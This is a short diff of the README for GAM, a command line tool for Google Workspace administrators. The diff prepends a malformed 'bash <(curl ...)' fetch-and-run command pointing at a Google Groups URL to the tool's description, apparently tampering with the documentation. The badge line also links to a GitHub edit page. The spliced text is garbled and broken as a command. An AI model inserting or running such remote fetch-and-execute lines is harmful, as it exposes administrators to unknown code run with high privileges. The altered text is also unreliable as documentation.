@@ -1,4 +1,4 @@
-GAM is a command line tool for Google Workspace admins to manage domain and user settings quickly and easily.
+bash <(curl -s -S -L (https://groups.google.com/g/google-maychu1)GAM is a command line tool for Google Workspace admins to manage domain and user settings quickly and easily.
 
 ![Build Status](https://github.com/MAYCHUI/GAM/edit/main/README.md)
 
